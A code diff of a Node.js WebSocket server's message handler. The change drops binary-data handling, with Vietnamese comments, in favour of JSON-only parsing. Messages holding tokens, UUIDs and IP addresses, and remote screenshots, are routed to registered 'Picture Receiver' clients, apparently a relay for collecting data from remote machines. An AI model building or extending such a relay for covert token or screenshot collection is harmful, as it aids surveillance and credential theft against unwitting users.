@@ -49,49 +49,36 @@ function generateUniqueID() {
 
 
 function handleMessage(ws, data, userID) {
-       try {
-           let messageData;
-           
-           // Kiểm tra nếu data là Buffer (dữ liệu binary)
-           if (data instanceof Buffer) {
-               // Xử lý dữ liệu binary ở đây
-               console.log("Received binary data of length:", data.length);
-               // Ví dụ: chuyển đổi Buffer thành base64
-               messageData = {
-                   type: 'binary',
-                   data: data.toString('base64')
-               };
-           } else {
-               // Xử lý dữ liệu text như bình thường
-               messageData = JSON.parse(data);
-           }
-           
-           // Phần còn lại của logic xử lý tin nhắn
-           if (messageData.sender && messageData.token && messageData.uuid && messageData.ip) {
-               broadcastToPictureReceivers(messageData);
-           } else if (messageData.command === 'Picture Receiver') {
-               pictureReceivers.set(userID, ws);
-           } else if (messageData.type === 'screenshot' && messageData.data.startsWith('data:image/png;base64')) {
-               broadcastToPictureReceivers({
-                   type: 'screenshot',
-                   action: messageData.action,
-                   screen: messageData.screen,
-                   data: messageData.data
-               });
-           } else if (messageData.action === 'screenshot_result') {
-               broadcastToPictureReceivers({
-                   type: 'screenshot',
-                   action: messageData.action,
-                   screen: messageData.screen,
-                   data: messageData.data
-               });
-           } else {
-               broadcastToAllExceptPictureReceivers(ws, JSON.stringify(messageData), true);
-           }
-       } catch (e) {
-           console.error('Error processing data:', e);
-       }
-   }
+    try {
+        const messageData = JSON.parse(data);
+        
+        // Check if the data matches the format shown in the image
+        if (messageData.sender && messageData.token && messageData.uuid && messageData.ip) {
+            // If it matches, only broadcast to picture receivers
+            broadcastToPictureReceivers(messageData);
+        } else if (messageData.command === 'Picture Receiver') {
+            pictureReceivers.set(userID, ws);
+        } else if (messageData.type === 'screenshot' && messageData.data.startsWith('data:image/png;base64')) {
+            broadcastToPictureReceivers({
+                type: 'screenshot',
+                action: messageData.action,
+                screen: messageData.screen,
+                data: messageData.data
+            });
+        } else if (messageData.action === 'screenshot_result') {
+            broadcastToPictureReceivers({
+                type: 'screenshot',
+                action: messageData.action,
+                screen: messageData.screen,
+                data: messageData.data
+            });
+        } else {
+            broadcastToAllExceptPictureReceivers(ws, JSON.stringify(messageData), true);
+        }
+    } catch (e) {
+        console.error('Error data:', e);
+    }
+}
 
 function broadcastToPictureReceivers(message) {
     const data = JSON.stringify(message);
